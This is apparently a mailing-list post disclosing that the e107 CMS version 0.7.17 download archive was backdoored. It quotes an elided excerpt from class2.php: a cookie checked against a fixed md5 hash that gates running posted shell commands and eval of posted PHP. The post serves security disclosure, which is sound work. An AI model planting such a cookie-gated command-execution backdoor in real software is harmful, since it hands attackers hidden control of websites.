Subject: e107 latest download link is backdoored

Hi guys,

The latest version of e107, version 0.7.17 contains a PHP backdoor.
http://e107.org/e107_files/downloads/e107_v0.7.17_full.zip

I've just downloaded this file and while looking through the code, I've
found the following piece of code:

file: class2.php, line: 1876

if(md5($_COOKIE['access-admin']) == "cf1afec15669cb96f09befb7d70f8bcb") {

...

if(!empty($_POST['cmd'])){
$out = execute($_POST['cmd']);
}

elseif(!empty($_POST['php'])){
ob_start();
eval($_POST['php']);
$out = ob_get_contents();
ob_end_clean();
}

...

and so on.

I've informed the e107 guys about this situation.
For now, that link is not safe.

Look at the file date, class2.php has been modified on 2010-01-23, 21:52:26
